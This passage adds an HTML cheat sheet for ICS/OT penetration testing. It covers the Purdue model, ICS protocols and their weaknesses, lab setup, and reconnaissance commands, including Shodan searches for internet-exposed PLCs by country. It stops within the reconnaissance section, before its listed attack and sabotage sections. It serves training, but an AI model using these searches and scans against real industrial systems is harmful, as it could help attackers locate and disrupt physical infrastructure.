@@ -1,0 +1,2077 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ICS/OT Hacking Cheat Sheet</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Inter:wght@300;400;500;600&display=swap');
+
+  :root {
+    --bg: #0a0d12;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --surface: #1a2030;
+    --surface2: #1f2838;
+    --border: #2a3a52;
+    --border2: #344a66;
+    --accent: #00d4ff;
+    --accent2: #ff6b35;
+    --accent3: #39ff9a;
+    --accent4: #ffd700;
+    --accent5: #ff4757;
+    --text: #c8d8f0;
+    --text2: #8899bb;
+    --text3: #556688;
+    --mono: 'Share Tech Mono', monospace;
+    --head: 'Rajdhani', sans-serif;
+    --body: 'Inter', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  /* ── HEADER ── */
+  .site-header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    height: 52px;
+  }
+  .logo {
+    font-family: var(--head);
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+  .logo span { color: var(--accent2); }
+  .search-wrap {
+    flex: 1;
+    max-width: 360px;
+  }
+  .search-wrap input {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 6px 12px 6px 32px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    outline: none;
+    transition: border 0.2s;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%23556688' stroke-width='2'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cpath d='m21 21-4.35-4.35'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: 10px center;
+  }
+  .search-wrap input:focus { border-color: var(--accent); }
+  .search-wrap input::placeholder { color: var(--text3); }
+  .header-stats {
+    display: flex;
+    gap: 16px;
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+  }
+  .header-stats span b { color: var(--accent3); }
+
+  /* ── LAYOUT ── */
+  .layout {
+    display: flex;
+    height: calc(100vh - 52px);
+  }
+
+  /* ── SIDEBAR ── */
+  .sidebar {
+    width: 220px;
+    flex-shrink: 0;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    padding: 16px 0;
+  }
+  .sidebar::-webkit-scrollbar { width: 4px; }
+  .sidebar::-webkit-scrollbar-track { background: transparent; }
+  .sidebar::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+  .nav-section-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 12px 16px 6px;
+  }
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 7px 16px;
+    cursor: pointer;
+    font-family: var(--body);
+    font-size: 13px;
+    color: var(--text2);
+    border-left: 2px solid transparent;
+    transition: all 0.15s;
+  }
+  .nav-item:hover { color: var(--text); background: var(--surface); }
+  .nav-item.active { color: var(--accent); border-left-color: var(--accent); background: rgba(0,212,255,0.06); }
+  .nav-dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    flex-shrink: 0;
+  }
+  .nav-item .level-badge {
+    margin-left: auto;
+    font-size: 9px;
+    font-family: var(--mono);
+    padding: 1px 5px;
+    border-radius: 3px;
+  }
+  .lvl-basic { background: rgba(57,255,154,0.12); color: var(--accent3); }
+  .lvl-mid { background: rgba(255,215,0,0.12); color: var(--accent4); }
+  .lvl-adv { background: rgba(255,71,87,0.12); color: var(--accent5); }
+
+  /* ── MAIN ── */
+  .main {
+    flex: 1;
+    overflow-y: auto;
+    padding: 28px 32px;
+    scroll-behavior: smooth;
+  }
+  .main::-webkit-scrollbar { width: 6px; }
+  .main::-webkit-scrollbar-track { background: transparent; }
+  .main::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+
+  /* ── SECTION ── */
+  .section { margin-bottom: 48px; scroll-margin-top: 24px; }
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+  .section-icon {
+    width: 32px; height: 32px;
+    border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 16px;
+    flex-shrink: 0;
+  }
+  .section-title {
+    font-family: var(--head);
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    color: #e8f0ff;
+  }
+  .section-sub {
+    font-size: 12px;
+    color: var(--text3);
+    font-family: var(--mono);
+    margin-top: 2px;
+  }
+  .difficulty-tag {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 3px 10px;
+    border-radius: 4px;
+    font-weight: 600;
+    letter-spacing: 1px;
+  }
+
+  /* ── CARDS ── */
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 16px;
+  }
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .card:hover { border-color: var(--border2); }
+  .card-head {
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface2);
+  }
+  .card-title {
+    font-family: var(--head);
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    color: #d8e8ff;
+    flex: 1;
+  }
+  .card-body { padding: 14px; }
+
+  /* ── COMMAND BLOCKS ── */
+  .cmd-block {
+    margin-bottom: 12px;
+    border-radius: 6px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+  .cmd-label {
+    background: var(--bg3);
+    padding: 5px 10px;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    letter-spacing: 1px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .copy-btn {
+    cursor: pointer;
+    font-size: 10px;
+    color: var(--text3);
+    background: none;
+    border: none;
+    padding: 0 4px;
+    font-family: var(--mono);
+    transition: color 0.15s;
+  }
+  .copy-btn:hover { color: var(--accent); }
+  .cmd-code {
+    background: #080c10;
+    padding: 10px 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.7;
+    color: var(--accent3);
+    white-space: pre;
+    overflow-x: auto;
+  }
+  .cmd-code::-webkit-scrollbar { height: 3px; }
+  .cmd-code::-webkit-scrollbar-thumb { background: var(--border2); }
+  .cmd-explain {
+    padding: 8px 10px;
+    background: rgba(0,212,255,0.04);
+    font-size: 12px;
+    color: var(--text2);
+    border-top: 1px solid var(--border);
+    line-height: 1.5;
+  }
+  .cmd-explain b { color: var(--accent); font-weight: 500; }
+  .cmd-explain .flag { color: var(--accent2); font-family: var(--mono); font-size: 11px; }
+  .cmd-explain .val { color: var(--accent4); font-family: var(--mono); font-size: 11px; }
+  .cmd-explain .danger { color: var(--accent5); }
+
+  /* ── INFO BOXES ── */
+  .info-box {
+    padding: 10px 14px;
+    border-radius: 6px;
+    margin-bottom: 12px;
+    font-size: 12px;
+    line-height: 1.6;
+    border-left: 3px solid;
+  }
+  .info-blue { background: rgba(0,212,255,0.06); border-color: var(--accent); color: var(--text2); }
+  .info-orange { background: rgba(255,107,53,0.06); border-color: var(--accent2); color: var(--text2); }
+  .info-green { background: rgba(57,255,154,0.06); border-color: var(--accent3); color: var(--text2); }
+  .info-red { background: rgba(255,71,87,0.06); border-color: var(--accent5); color: var(--text2); }
+  .info-gold { background: rgba(255,215,0,0.06); border-color: var(--accent4); color: var(--text2); }
+  .info-box strong { display: block; font-family: var(--head); font-size: 13px; font-weight: 600; margin-bottom: 4px; letter-spacing: 0.5px; }
+  .info-blue strong { color: var(--accent); }
+  .info-orange strong { color: var(--accent2); }
+  .info-green strong { color: var(--accent3); }
+  .info-red strong { color: var(--accent5); }
+  .info-gold strong { color: var(--accent4); }
+
+  /* ── TABLE ── */
+  .ref-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+    margin-bottom: 16px;
+  }
+  .ref-table th {
+    background: var(--bg3);
+    padding: 7px 12px;
+    text-align: left;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    letter-spacing: 1px;
+    border-bottom: 1px solid var(--border);
+  }
+  .ref-table td {
+    padding: 7px 12px;
+    border-bottom: 1px solid rgba(42,58,82,0.5);
+    color: var(--text2);
+    vertical-align: top;
+  }
+  .ref-table tr:last-child td { border-bottom: none; }
+  .ref-table td:first-child { font-family: var(--mono); color: var(--accent3); font-size: 11px; }
+  .ref-table td:nth-child(2) { color: var(--accent4); font-family: var(--mono); font-size: 11px; }
+
+  /* ── PROTOCOL BADGE ── */
+  .proto { display: inline-block; font-family: var(--mono); font-size: 10px; padding: 1px 6px; border-radius: 3px; margin-right: 4px; }
+  .proto-modbus { background: rgba(0,212,255,0.15); color: var(--accent); border: 1px solid rgba(0,212,255,0.3); }
+  .proto-dnp3 { background: rgba(255,107,53,0.15); color: var(--accent2); border: 1px solid rgba(255,107,53,0.3); }
+  .proto-s7 { background: rgba(57,255,154,0.15); color: var(--accent3); border: 1px solid rgba(57,255,154,0.3); }
+  .proto-enip { background: rgba(255,215,0,0.15); color: var(--accent4); border: 1px solid rgba(255,215,0,0.3); }
+  .proto-opc { background: rgba(255,71,87,0.15); color: var(--accent5); border: 1px solid rgba(255,71,87,0.3); }
+
+  /* ── PHASE TIMELINE ── */
+  .phase-bar {
+    display: flex;
+    gap: 6px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+  }
+  .phase-step {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 8px 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    font-family: var(--head);
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    color: var(--text2);
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .phase-step:hover { border-color: var(--border2); color: var(--text); }
+  .phase-step.active { border-color: var(--accent); color: var(--accent); background: rgba(0,212,255,0.06); }
+  .phase-num {
+    width: 20px; height: 20px;
+    border-radius: 50%;
+    background: var(--bg3);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px;
+    font-family: var(--mono);
+    color: var(--text3);
+  }
+  .phase-step.active .phase-num { background: rgba(0,212,255,0.15); color: var(--accent); }
+
+  /* ── TAG CLOUD ── */
+  .tag-row { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px; }
+  .tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 3px;
+    border: 1px solid var(--border);
+    color: var(--text3);
+    background: var(--bg3);
+  }
+
+  /* ── HIGHLIGHT spans ── */
+  .hl-port { color: var(--accent4); font-family: var(--mono); font-size: 11px; font-weight: 600; }
+  .hl-tool { color: var(--accent2); font-weight: 500; }
+  .hl-proto { color: var(--accent); font-family: var(--mono); font-size: 11px; }
+  .hl-warn { color: var(--accent5); font-weight: 500; }
+
+  /* ── SEARCH HIDDEN ── */
+  .search-hidden { display: none !important; }
+
+  /* scrollbar overall */
+  html { scrollbar-width: thin; scrollbar-color: var(--border2) transparent; }
+
+  /* Wide single-col cards */
+  .card-full { grid-column: 1 / -1; }
+
+  @media (max-width: 700px) {
+    .sidebar { display: none; }
+    .card-grid { grid-template-columns: 1fr; }
+    .main { padding: 16px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="logo">ICS<span>/OT</span> PENTESTING</div>
+  <div class="search-wrap">
+    <input type="text" id="searchBox" placeholder="search commands, protocols, tools..." />
+  </div>
+  <div class="header-stats">
+    <span><b id="cmdCount">120+</b> commands</span>
+    <span><b>15</b> protocols</span>
+    <span><b>8</b> phases</span>
+  </div>
+</header>
+
+<div class="layout">
+  <nav class="sidebar">
+    <div class="nav-section-label">FUNDAMENTALS</div>
+    <div class="nav-item active" onclick="scrollTo('s0')"><span class="nav-dot" style="background:#39ff9a"></span> ICS/OT Concepts <span class="level-badge lvl-basic">BASIC</span></div>
+    <div class="nav-item" onclick="scrollTo('s1')"><span class="nav-dot" style="background:#39ff9a"></span> Protocols & Ports <span class="level-badge lvl-basic">BASIC</span></div>
+    <div class="nav-item" onclick="scrollTo('s2')"><span class="nav-dot" style="background:#39ff9a"></span> Lab Setup <span class="level-badge lvl-basic">BASIC</span></div>
+
+    <div class="nav-section-label">RECON</div>
+    <div class="nav-item" onclick="scrollTo('s3')"><span class="nav-dot" style="background:#ffd700"></span> Network Discovery <span class="level-badge lvl-mid">MID</span></div>
+    <div class="nav-item" onclick="scrollTo('s4')"><span class="nav-dot" style="background:#ffd700"></span> Protocol Scanning <span class="level-badge lvl-mid">MID</span></div>
+    <div class="nav-item" onclick="scrollTo('s5')"><span class="nav-dot" style="background:#ffd700"></span> Device Fingerprint <span class="level-badge lvl-mid">MID</span></div>
+
+    <div class="nav-section-label">EXPLOITATION</div>
+    <div class="nav-item" onclick="scrollTo('s6')"><span class="nav-dot" style="background:#ff6b35"></span> Modbus Attacks <span class="level-badge lvl-mid">MID</span></div>
+    <div class="nav-item" onclick="scrollTo('s7')"><span class="nav-dot" style="background:#ff6b35"></span> DNP3 Attacks <span class="level-badge lvl-mid">MID</span></div>
+    <div class="nav-item" onclick="scrollTo('s8')"><span class="nav-dot" style="background:#ff4757"></span> S7 / Siemens <span class="level-badge lvl-adv">ADV</span></div>
+    <div class="nav-item" onclick="scrollTo('s9')"><span class="nav-dot" style="background:#ff4757"></span> EtherNet/IP <span class="level-badge lvl-adv">ADV</span></div>
+    <div class="nav-item" onclick="scrollTo('s10')"><span class="nav-dot" style="background:#ff4757"></span> OPC / WinCC <span class="level-badge lvl-adv">ADV</span></div>
+
+    <div class="nav-section-label">TECHNIQUES</div>
+    <div class="nav-item" onclick="scrollTo('s11')"><span class="nav-dot" style="background:#ff4757"></span> MiTM / Replay <span class="level-badge lvl-adv">ADV</span></div>
+    <div class="nav-item" onclick="scrollTo('s12')"><span class="nav-dot" style="background:#ff4757"></span> Firmware / HMI <span class="level-badge lvl-adv">ADV</span></div>
+    <div class="nav-item" onclick="scrollTo('s13')"><span class="nav-dot" style="background:#ffd700"></span> Lateral Movement <span class="level-badge lvl-mid">MID</span></div>
+    <div class="nav-item" onclick="scrollTo('s14')"><span class="nav-dot" style="background:#ff4757"></span> Impact & Sabotage <span class="level-badge lvl-adv">ADV</span></div>
+
+    <div class="nav-section-label">REFERENCE</div>
+    <div class="nav-item" onclick="scrollTo('s15')"><span class="nav-dot" style="background:#39ff9a"></span> Tools Glossary</div>
+    <div class="nav-item" onclick="scrollTo('s16')"><span class="nav-dot" style="background:#39ff9a"></span> Lab Checklist</div>
+  </nav>
+
+  <main class="main" id="mainContent">
+
+    <!-- ══════════ SECTION 0: CONCEPTS ══════════ -->
+    <section class="section" id="s0">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(57,255,154,0.1)">🏭</div>
+        <div>
+          <div class="section-title">ICS / OT Core Concepts</div>
+          <div class="section-sub">Understand the architecture before you hack it</div>
+        </div>
+        <span class="difficulty-tag lvl-basic" style="background:rgba(57,255,154,0.1);color:#39ff9a;border:1px solid rgba(57,255,154,0.3)">BASIC</span>
+      </div>
+
+      <div class="info-box info-blue">
+        <strong>🧠 Why ICS/OT is different from IT pentesting</strong>
+        In IT: confidentiality > integrity > availability. In ICS/OT: <b>AVAILABILITY IS #1</b>. A crashed PLC doesn't just lose data — it can blow up a boiler, open a dam, or cut power. Availability of physical process is the prime directive. Approach everything with this lens.
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">🏗️ The Purdue Model (ISA-95) — ICS Architecture Layers</span></div>
+          <div class="card-body">
+            <div class="info-box info-green">
+              <strong>Level 0 — Physical Process</strong>
+              Actual sensors (temperature, pressure, flow), actuators (valves, motors). This is the "real world" being controlled. No cyber here — but this is the target impact zone.
+            </div>
+            <div class="info-box info-blue">
+              <strong>Level 1 — Field Devices / Instruments</strong>
+              PLCs (Programmable Logic Controllers), RTUs (Remote Terminal Units), IEDs (Intelligent Electronic Devices). They read sensors and drive actuators based on logic programs. <b>Most attack targets live here.</b>
+            </div>
+            <div class="info-box info-orange">
+              <strong>Level 2 — Control Systems</strong>
+              HMIs (Human Machine Interfaces), SCADA servers, DCS (Distributed Control Systems). Operators see dashboards here. Alarms live here. Attackers target HMIs to suppress alarms or fake readings.
+            </div>
+            <div class="info-box info-gold">
+              <strong>Level 3 — Site Operations (MES)</strong>
+              Historian servers (store process data), Manufacturing Execution Systems. Bridge between OT and IT. Often poorly segmented — <b>key pivot point.</b>
+            </div>
+            <div class="info-box info-red">
+              <strong>Level 4/5 — Enterprise / Internet</strong>
+              Corporate IT network, ERP. Attacker's typical entry point. Goal: break through the DMZ down to Level 1-2.
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">⚙️ Key Devices Explained</span></div>
+          <div class="card-body">
+            <table class="ref-table">
+              <tr><th>DEVICE</th><th>ABBR</th><th>ROLE</th></tr>
+              <tr><td>PLC</td><td>—</td><td>Reads sensors, runs ladder logic, drives actuators. Brain of field control.</td></tr>
+              <tr><td>RTU</td><td>—</td><td>Like a PLC but for remote/unmanned sites (pipelines, substations). Uses DNP3/IEC 101.</td></tr>
+              <tr><td>HMI</td><td>—</td><td>Operator screen. Windows PC running SCADA software (WinCC, FactoryTalk, Ignition).</td></tr>
+              <tr><td>IED</td><td>—</td><td>Smart relay in power grid. Uses IEC 61850/GOOSE. Trips circuit breakers.</td></tr>
+              <tr><td>DCS</td><td>—</td><td>Distributed Control System — like many PLCs coordinated. Used in oil/chem plants.</td></tr>
+              <tr><td>Historian</td><td>—</td><td>Time-series DB for all process data (PI Historian, Wonderware). Gold mine for recon.</td></tr>
+              <tr><td>EWS</td><td>—</td><td>Engineering Workstation — programs PLCs. If compromised, you own the PLC logic.</td></tr>
+            </table>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🎯 Attack Objectives in ICS</span></div>
+          <div class="card-body">
+            <div class="info-box info-red"><strong>Loss of View</strong>Blind operators — suppress or falsify HMI data/alarms so they can't see the real process state.</div>
+            <div class="info-box info-red"><strong>Loss of Control</strong>Prevent commands from reaching PLCs — denial of control. e.g., can't open/close a valve remotely.</div>
+            <div class="info-box info-red"><strong>Manipulation of Control</strong>Send wrong commands or inject false setpoints — <b>most dangerous</b>. Forces physics into unsafe state.</div>
+            <div class="info-box info-orange"><strong>Ransomware / Availability</strong>Lock HMIs, historian, EWS — disrupt operations without touching the PLC directly.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 1: PROTOCOLS & PORTS ══════════ -->
+    <section class="section" id="s1">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(0,212,255,0.1)">📡</div>
+        <div>
+          <div class="section-title">ICS Protocols & Ports</div>
+          <div class="section-sub">Know what to scan for and what each port means</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(57,255,154,0.1);color:#39ff9a;border:1px solid rgba(57,255,154,0.3)">BASIC</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">📋 Protocol Quick Reference</span></div>
+          <div class="card-body">
+            <table class="ref-table">
+              <tr><th>PROTOCOL</th><th>PORT</th><th>USED IN</th><th>KEY WEAKNESS</th></tr>
+              <tr><td><span class="proto proto-modbus">Modbus TCP</span></td><td>502/TCP</td><td>PLCs, RTUs, sensors. Most common ICS protocol.</td><td>Zero auth. No encryption. Anyone on network can read/write coils/registers.</td></tr>
+              <tr><td><span class="proto proto-dnp3">DNP3</span></td><td>20000/TCP+UDP</td><td>SCADA, substations, water/oil RTUs</td><td>No auth by default. DNP3 SA (secure auth) rarely deployed. Spoofable.</td></tr>
+              <tr><td><span class="proto proto-s7">S7comm</span></td><td>102/TCP</td><td>Siemens S7 PLCs (S7-300/400/1200/1500)</td><td>S7comm-plus (1200/1500) has crypto but is breakable. Stuxnet used this.</td></tr>
+              <tr><td><span class="proto proto-enip">EtherNet/IP</span></td><td>44818/TCP, 2222/UDP</td><td>Allen-Bradley (Rockwell), AB PLCs</td><td>CIP protocol on top. Read/write tags directly. No auth in most configs.</td></tr>
+              <tr><td><span class="proto proto-opc">OPC-DA/UA</span></td><td>135, 4840/TCP</td><td>SCADA ↔ HMI data exchange middleware</td><td>OPC-DA uses DCOM (135) — many vulns. OPC-UA has auth but often misconfigured.</td></tr>
+              <tr><td>IEC 61850 / GOOSE</td><td>102/TCP, multicast</td><td>Power grid IEDs, substations</td><td>GOOSE is unauthenticated multicast — inject frames to trip breakers.</td></tr>
+              <tr><td>BACnet</td><td>47808/UDP</td><td>Building Automation (HVAC, lifts)</td><td>No auth. COV (change of value) subscribe → read all sensor data.</td></tr>
+              <tr><td>EtherCAT</td><td>Layer 2</td><td>High-speed motion control (robotics)</td><td>No crypto at all — Ethernet frame level. Physical access needed.</td></tr>
+              <tr><td>PROFINET</td><td>34964/UDP</td><td>Siemens field bus (conveyor, manufacturing)</td><td>DCP (discovery) unauthenticated. Can rename/reset devices.</td></tr>
+              <tr><td>IEC 104</td><td>2404/TCP</td><td>SCADA over IP (power/water utilities)</td><td>No encryption. Command injection possible.</td></tr>
+              <tr><td>Historian / OSIsoft PI</td><td>5450/TCP</td><td>Process data historian</td><td>Unauthenticated access in legacy. Read all plant sensor history.</td></tr>
+              <tr><td>SRTP (GE)</td><td>18245/TCP</td><td>GE PLCs (Series 90, PAC8000)</td><td>Protocol reversing enables arbitrary read/write.</td></tr>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 2: LAB SETUP ══════════ -->
+    <section class="section" id="s2">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(57,255,154,0.1)">🧪</div>
+        <div>
+          <div class="section-title">Lab Setup for Beginners</div>
+          <div class="section-sub">Build your ICS hacking lab — safely</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(57,255,154,0.1);color:#39ff9a;border:1px solid rgba(57,255,154,0.3)">BASIC</span>
+      </div>
+
+      <div class="info-box info-red">
+        <strong>⚠️ NEVER practice on real production systems. Ever.</strong>
+        ICS systems control physical processes. A wrong write to a PLC in a real plant can destroy equipment, cause injury, or kill people. Always use simulators, VMs, or dedicated lab hardware.
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🛠️ Recommended Lab Platforms</span></div>
+          <div class="card-body">
+            <div class="info-box info-green"><strong>GNS3 + ScadaBR + OpenPLC</strong>OpenPLC is a free software PLC runtime. ScadaBR is a free SCADA. Run both as VMs. Connect them over GNS3 virtual network. Supports Modbus, DNP3.</div>
+            <div class="info-box info-blue"><strong>SoftPLC / OpenPLC Runtime</strong>Install on Linux. Simulates real PLC. Runs ladder logic. Exposes Modbus TCP on port 502. Perfect first target.</div>
+            <div class="info-box info-orange"><strong>Mininet-based ICS simulations</strong>ICSim (SCADAPACK/gas pipeline sim). Grfp (power grid sim). Both run on Ubuntu. Git repos available.</div>
+            <div class="info-box info-gold"><strong>Real hardware (budget)</strong>Siemens LOGO! (~$80), Click PLCs (~$100), or eBay S7-200. Cheap, real protocol behavior. Best for hands-on.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">📦 Tool Installation (Kali / Parrot)</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">install core ICS tools</div>
+              <div class="cmd-code">sudo apt install nmap python3-pip git -y
+
+# Metasploit (has ICS modules)
+sudo apt install metasploit-framework -y
+
+# Install Python ICS libraries
+pip3 install pymodbus scapy
+pip3 install pysnmp python-snap7
+
+# Clone specialized tools
+git clone https://github.com/sourceperl/mbtget
+git clone https://github.com/atimorin/scada-tools
+git clone https://github.com/drainware/plcscan</div>
+              <div class="cmd-explain">These form your baseline ICS recon toolkit. <b>pymodbus</b> = talk Modbus. <b>snap7</b> = talk to Siemens S7 PLCs. <b>scapy</b> = raw packet crafting for any protocol.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔍 Key Labs to Practice On</span></div>
+          <div class="card-body">
+            <div class="info-box info-blue"><strong>HackTheBox — ICS / SCADA Challenges</strong>HTB has dedicated ICS machines. Look for tags: Modbus, SCADA, Industrial. Start with easy-rated ones first.</div>
+            <div class="info-box info-green"><strong>Pentester Academy — SCADA Security</strong>Paid but has full ICS lab with PLC simulators. Best structured curriculum for beginners.</div>
+            <div class="info-box info-orange"><strong>TryHackMe — Industrial</strong>Some THM rooms cover basic SCADA recon. Free tier available.</div>
+            <div class="info-box info-gold"><strong>CISA / ICS-CERT Resources</strong>Free training at ics-cert.us-cert.gov — includes virtual lab environments for public utilities sector.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 3: NETWORK DISCOVERY ══════════ -->
+    <section class="section" id="s3">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,215,0,0.1)">🔭</div>
+        <div>
+          <div class="section-title">Network Discovery & ICS Host Detection</div>
+          <div class="section-sub">Phase 1 — Find what's on the network without crashing it</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">MID</span>
+      </div>
+
+      <div class="info-box info-red">
+        <strong>⚠️ SLOW DOWN. ICS devices are fragile.</strong>
+        Standard nmap SYN scans can crash PLCs and RTUs. Use <span class="hl-warn">--max-rate 10</span>, avoid aggressive scan options (-A, -T4, -T5). Always prefer passive recon first.
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🌐 Passive Recon — No Traffic Generated</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">wireshark / tcpdump — listen passively</div>
+              <div class="cmd-code">tcpdump -i eth0 -nn port 502 or port 102 \
+  or port 44818 or port 20000 \
+  or port 47808 -w ics_capture.pcap</div>
+              <div class="cmd-explain">Listen on <b>eth0</b> for known ICS protocol ports. <span class="flag">-nn</span> = no DNS/port name resolution (faster). <span class="flag">-w</span> = write to file. Just watching tells you what protocols are alive on the segment. Zero risk of crashing devices.</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">zeek / bro — protocol-aware passive analysis</div>
+              <div class="cmd-code">zeek -i eth0 /opt/zeek/share/zeek/policy/\
+  protocols/modbus/main.zeek</div>
+              <div class="cmd-explain">Zeek automatically decodes ICS protocols from a packet capture or live interface and writes structured logs. <b>modbus.log, dnp3.log, enip.log</b> are created automatically. Gold for reconnaissance without active probing.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔍 Active Scanning — Careful Mode</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">nmap — safe ICS scan (slow, no crash)</div>
+              <div class="cmd-code">nmap -sS -p 102,502,2222,4840,20000,44818 \
+  --max-rate 10 --open -T2 \
+  -oN ics_hosts.txt 192.168.1.0/24</div>
+              <div class="cmd-explain"><span class="flag">-sS</span> = SYN scan (half-open). <span class="flag">-p</span> = ONLY scan these ICS ports, don't waste time on 1-65535. <span class="flag">--max-rate 10</span> = max 10 packets/sec — <b>critical for ICS safety</b>. <span class="flag">-T2</span> = polite timing. <span class="flag">--open</span> = only show open ports.</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">nmap ICS NSE scripts</div>
+              <div class="cmd-code">nmap -sV --script modbus-discover \
+  -p 502 192.168.1.0/24 --max-rate 5
+
+nmap -sV --script s7-info \
+  -p 102 192.168.1.0/24 --max-rate 5
+
+nmap -sV --script enip-info \
+  -p 44818 192.168.1.0/24 --max-rate 5</div>
+              <div class="cmd-explain">nmap has built-in ICS scripts. <b>modbus-discover</b> = reads device ID from Modbus (function code 43). <b>s7-info</b> = grabs PLC name, serial, firmware version from Siemens S7. <b>enip-info</b> = reads Allen-Bradley device identity. Great for asset inventory recon.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔎 Shodan — Internet-facing ICS</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">shodan CLI queries for exposed ICS</div>
+              <div class="cmd-code"># Install
+pip3 install shodan
+shodan init YOUR_API_KEY
+
+# Search exposed Modbus systems
+shodan search "port:502 Modbus"
+
+# Exposed Siemens S7 PLCs
+shodan search "port:102 S7"
+
+# Exposed Allen-Bradley
+shodan search "port:44818 CIP"
+
+# Filter by country
+shodan search "port:502 country:IN"
+
+# Download results
+shodan download --limit 100 modbus.json \
+  "port:502 Modbus"</div>
+              <div class="cmd-explain">Shodan indexes internet-facing ICS devices. <b>Shocking how many real PLCs are exposed.</b> Use for CTF/research recon — <span class="hl-warn">never attack real systems you don't own</span>. Filter by <span class="flag">country:IN</span>, <span class="flag">org:</span>, <span class="flag">before:</span>, <span class="flag">after:</span> to narrow results. Port 502 = Modbus, 102 = S7, 44818 = EtherNet/IP.</div>
+            </div>
